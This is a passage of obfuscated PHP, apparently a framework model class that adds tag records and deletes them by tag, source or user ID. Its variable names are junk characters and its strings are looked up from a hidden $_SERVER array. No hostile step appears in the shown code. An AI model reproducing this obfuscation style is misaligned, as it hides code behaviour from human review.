$Ä¸‡¦´[209]; } } $ûà±¾æˆ = array($Ä¸‡¦´[1642] => USER_ID, $Ä¸‡¦´[492] => $‡Ã†¡´š, $Ä¸‡¦´[429] => $Èğ£Æ„ö, $Ä¸‡¦´[430] => $áÄÎÜ§ì ? $áÄÎÜ§ì : $Ä¸‡¦´[424], $Ä¸‡¦´[428] => $ËàÍ‹Ù¥ ? $ËàÍ‹Ù¥ : $Ä¸‡¦´[12], $Ä¸‡¦´[1827] => 0); if ($this->where($ûà±¾æˆ)->find()) { return !1; } return $this->add($ûà±¾æˆ); } protected function removeFromTag($ÛÖĞğçê, $‘¼¹Áå¯) { $¤Ş®şßÍ =& $_SERVER[¤·²È‰º]; if (!Model($¤Ş®şßÍ[2078])->listData($‘¼¹Áå¯)) { return !1; } if (is_array($ÛÖĞğçê)) { $ÛÖĞğçê = array($¤Ş®şßÍ[7], $ÛÖĞğçê); } $ÈÑ¨½¸û = array($¤Ş®şßÍ[1642] => USER_ID, $¤Ş®şßÍ[492] => $‘¼¹Áå¯, $¤Ş®şßÍ[429] => $ÛÖĞğçê); return $this->where($ÈÑ¨½¸û)->delete(); } protected function removeByTag($ÙÎ—ÅÜã) { $ñ†¹©¾Ÿ =& $_SERVER[¤·²È‰º]; if (!$ÙÎ—ÅÜã) { return !1; } $ûÎÄ¿Éà = array($ñ†¹©¾Ÿ[1642] => USER_ID, $ñ†¹©¾Ÿ[492] => $ÙÎ—ÅÜã); return $this->where($ûÎÄ¿Éà)->delete(); } protected function removeBySource($üÑ½¿™í) { $Ä§¦ˆ‰ =& $_SERVER[¤·²È‰º]; if (is_array($üÑ½¿™í)) { $üÑ½¿™í = array($Ä§¦ˆ‰[7], $üÑ½¿™í); } $É ªä·± = array($Ä§¦ˆ‰[1642] => USER_ID, $Ä§¦ˆ‰[492] => array($Ä§¦ˆ‰[1008], 0), $Ä§¦ˆ‰[429] => $üÑ½¿™í); return $this->where($É ªä·±)->delete(); } }